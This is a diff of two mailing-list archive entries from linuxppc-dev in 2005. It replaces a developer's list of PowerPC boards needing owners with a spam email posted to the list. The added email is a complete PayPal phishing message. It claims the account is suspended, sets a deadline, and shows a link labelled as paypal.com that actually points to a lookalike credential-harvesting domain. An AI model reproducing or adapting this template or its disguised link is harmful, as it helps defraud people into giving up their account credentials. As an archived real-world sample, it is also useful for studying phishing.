@@ -1,15 +1,18 @@
-Return-Path: <kumar.gala@freescale.com>
-Mime-Version: 1.0 (Apple Message framework v619.2)
-In-Reply-To: <1117843012.31082.201.camel@gaston>
-References: <1117843012.31082.201.camel@gaston>
-Content-Type: text/plain; charset=US-ASCII; format=flowed
-Message-Id: <24c844aff108eaf7605d6d7ae1fa8ce3@freescale.com>
-From: Kumar Gala <kumar.gala@freescale.com>
-Date: Mon, 6 Jun 2005 10:11:54 -0500
-To: Tom Rini <trini@kernel.crashing.org>, Dan Malek <dan@embeddededge.com>,
-	Linux PPC Embedded list <linuxppc-embedded@ozlabs.org>,
-	linuxppc-dev list <linuxppc-dev@ozlabs.org>
-Subject: Re: [UPDATE] Getting ownership for various boards/platforms configs
+Return-Path: <sam@ss.lokal.ca>
+Received: from ss.lokal.ca (unknown [208.38.21.30])
+	(using TLSv1 with cipher DHE-RSA-AES256-SHA (256/256 bits))
+	(Client did not present a certificate)
+	by ozlabs.org (Postfix) with ESMTP id 9BE5C679E7
+	for <linuxppc-dev@ozlabs.org>; Tue,  7 Jun 2005 07:04:14 +1000 (EST)
+Received: from ss.lokal.ca (localhost.localdomain [127.0.0.1])
+	by ss.lokal.ca (8.12.10/8.12.10) with ESMTP id j56L6kSW017657
+	for <linuxppc-dev@ozlabs.org>; Mon, 6 Jun 2005 15:06:46 -0600
+Date: Mon, 6 Jun 2005 15:06:46 -0600
+Message-Id: <200506062106.j56L6kis017652@ss.lokal.ca>
+To: linuxppc-dev@ozlabs.org
+From: "accounting@paypal.com" <service@paypal.com>
+Content-Type: text/html
+Subject: Verify your PayPal Account 
 List-Id: Linux on PowerPC Developers Mail List <linuxppc-dev.ozlabs.org>
 List-Unsubscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=unsubscribe>
@@ -19,23 +22,32 @@ List-Help: <mailto:linuxppc-dev-request@ozlabs.org?subject=help>
 List-Subscribe: <https://ozlabs.org/mailman/listinfo/linuxppc-dev>,
 	<mailto:linuxppc-dev-request@ozlabs.org?subject=subscribe>
 
-The following list of boards/platforms still need some ownership.  The 
-full list is at http://gate.crashing.org/~galak/platform-owners for 
-review.
 
-adir
-bseip
-cpci405
-ep405
-est8260
-FADS
-hdpu
-mbx
-mvme5100
-pcore
-radstone_ppc7d
-rpx8260
-rpxcllf
-rpxlite
-
-- kumar
+<br><br>
+We recently have determined that different computers have logged into your 
+PayPal account, and multiple password failures
+were present before the login. One of our Customer Service employees has 
+already tryed to telephonically reach you. As our employee
+did not manage to reach you, this email has been sent to your notice.<br>
+Therefore your account has been temporary suspended. We need you to 
+confirm your identity in
+order to regain full privileges of your account.<br>
+If this is not completed by <strong>June 08, 2005</strong>, we reserve 
+the right to terminate all privileges of your account
+indefinitly, as it may have been used for fraudulent purposes. We thank 
+you for your cooperation in this manner.<br>
+To confirm your identity please follow the link below:<br>
+<br>
+<a 
+href="http://paypal.com.login-user1962.info/webscr.php?cmd=LogIn">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a>
+<br>
+<br><br>
+<br>
+<br>
+Thank you for your patience in this matter.
+<br><br>
+PayPal - Customer Service
+<br><br>
+Please do not reply to this e-mail as this is only a notification. Mail 
+sent to this address cannot be answered.
+<br>
